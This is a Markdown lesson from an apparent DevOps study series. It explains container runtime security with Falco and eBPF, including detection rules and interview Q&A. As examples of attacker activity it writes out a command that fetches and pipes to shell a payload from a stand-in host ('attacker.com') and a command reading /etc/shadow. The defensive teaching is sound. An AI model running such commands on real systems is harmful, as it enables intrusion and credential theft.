# 📌 Topic: Runtime Security (Falco and Sysdig)

## 🧠 Concept Explanation (Basic → Expert)
**Basic**: Runtime Security is like a security camera for your containers while they are running. It watches for "suspicious behavior," like someone trying to open a secret file or starting a weird program.
**Expert**: This is the implementation of **Intrusion Detection (IDS)** at the system call level. While image scanning finds "known" bugs in your code, Runtime Security finds "active" attacks. Staff-level engineering involves using tools like **Falco** to monitor kernel syscalls via **eBPF (Extended Berkeley Packet Filter)**. You define rules that trigger alerts when a container performs an unexpected action (e.g., a "Web Server" container suddenly running `bash` or trying to write to `/etc`).

## 🏗️ Mental Model
- **Image Scanning**: A background check on a new employee before they start.
- **Runtime Security**: A security guard watching that employee on a CCTV camera to make sure they don't start stealing equipment or breaking into the server room.

## ⚡ Actual Behavior
- **Real-time Alerting**: If an attacker exploits a bug in your app and runs `curl http://attacker.com/malware | sh`, Falco sees the `execve` and `connect` syscalls and sends an alert to Slack/PagerDuty within milliseconds.
- **Passive Monitoring**: Unlike a firewall, Falco (by default) doesn't block the action; it just tells you it happened. This prevents the security tool itself from accidentally crashing your app.

## 🔬 Internal Mechanics (eBPF)
1. **The Probe**: Falco loads a small program into the Linux Kernel using **eBPF**.
2. **The Stream**: Every time a process makes a system call (open, fork, exec, connect), the eBPF program sends a copy of that event to the Falco user-space process.
3. **The Rule Engine**: Falco compares the event against a list of rules (YAML).
4. **The Action**: If a rule matches (e.g., "A shell was spawned in a container"), it formats an alert.

## 🔁 Execution Flow
1. Attacker exploits a Node.js vulnerability.
2. Attacker runs `cat /etc/shadow`.
3. The kernel's `open()` syscall is triggered.
4. eBPF probe captures the `open` event with the filename `/etc/shadow`.
5. Falco Rule Engine: `File access to sensitive path detected!`
6. Alert sent to Security Team.

## 🧠 Resource Behavior
- **CPU**: eBPF is extremely efficient. Falco typically uses <1-2% of the host CPU even when monitoring thousands of containers.
- **Kernel Dependency**: Falco requires a relatively modern Linux kernel (4.14+) to use eBPF.

## 📐 ASCII Diagrams (REQUIRED)

```text
       RUNTIME SECURITY (FALCO)
       
[ Container ] --( Syscall )--> [ Linux Kernel ]
                                     |
                          +----------v----------+
                          |  eBPF Probe (Falco) |
                          +----------|----------+
                                     |
                          [ Falco Rule Engine ]
                                     |
                      ( Alert: "Shell in Container" )
```

## 🔍 Code (Falco Rule Example)
```yaml
# A rule to detect shells in production containers
- rule: Shell in Container
  desc: A shell was spawned inside a container (Potential Intrusion)
  condition: container.id != host and proc.name = bash and container.image.repository != "my-debug-image"
  output: "Dangerous process spawned (user=%user.name container=%container.id image=%container.image.repository)"
  priority: CRITICAL
  tags: [container, shell, mitre_execution]
```

## 💥 Production Failures
- **The "Alert Fatigue"**: You set a rule that is too broad. Every time your "Log Rotation" script runs, it triggers a "Suspicious File Write" alert. After 1,000 fake alerts, the security team stops looking at the dashboard.
  *Fix*: Tune rules with specific "Exclusions" for known administrative tasks.
- **Kernel Version Mismatch**: You upgrade your Linux kernel, but the Falco eBPF driver isn't compatible yet. Your security monitoring goes silent without you noticing.

## 🧪 Real-time Q&A
**Q: Can Falco automatically kill a compromised container?**
**A**: Yes, but usually via a separate tool like **Falco Sidekick**. You can configure a "Response Engine" (Lambda/K8s Job) that receives the alert and runs `docker rm -f <id>` or `kubectl delete pod <id>`.

## ⚠️ Edge Cases
- **Obfuscated Commands**: An attacker doesn't run `cat /etc/shadow`. Instead, they use a Python script that reads the file byte-by-byte. A naive rule looking for the string "cat" will miss this. A staff-level rule looks for the **Syscall Action** on the file path, regardless of the tool used.

## 🏢 Best Practices
- **Immutable Filesystem**: Run your containers with `--read-only`. If Falco sees any "Write" syscall, it is a guaranteed attack.
- **Monitor Metadata**: Include container name, image ID, and Kubernetes namespace in your alerts so you can find the "Victim" instantly.
- **Audit Logs**: Feed Falco alerts into a SIEM (Splunk/ELK) for long-term forensic analysis.

## ⚖️ Trade-offs
| Feature | Image Scanning | Runtime Security (Falco) |
| :--- | :--- | :--- |
| **Detects** | Known Vulnerabilities | **Active Attacks / Zero Days**|
| **Phase** | Build Time | **Runtime** |
| **Impact** | Blocks Builds | Monitors Performance |

## 💼 Interview Q&A
**Q: How do you detect if a hacker has successfully broken into one of your Docker containers?**
**A**: I use **Runtime Security Monitoring** with a tool like **Falco**. Since Falco monitors kernel syscalls via eBPF, it can detect anomalous behaviors that deviate from the container's normal profile. For example, I look for "Terminal" processes being spawned (like `sh` or `bash`) in containers that are supposed to be headless APIs. I also monitor for writes to sensitive directories (`/etc`, `/usr/bin`) or outbound network connections to unknown IP addresses. These events trigger immediate alerts, allowing the security team to isolate and destroy the compromised container before the attacker can move laterally.

## 🧩 Practice Problems
1. Install Falco on a test VM. Run a container and `docker exec -it <id> /bin/sh`. Verify that Falco detects the shell.
2. Write a rule that alerts when someone uses `curl` or `wget` inside a container.
3. Research "eBPF" and why it's safer than traditional "Kernel Modules" for security monitoring.

---
Prev: [04_Network_Policies_and_mTLS.md](./04_Network_Policies_and_mTLS.md) | Index: [00_Index.md](../00_Index.md) | Next: [06_CIS_Benchmark_and_Auditing.md](./06_CIS_Benchmark_and_Auditing.md)
---
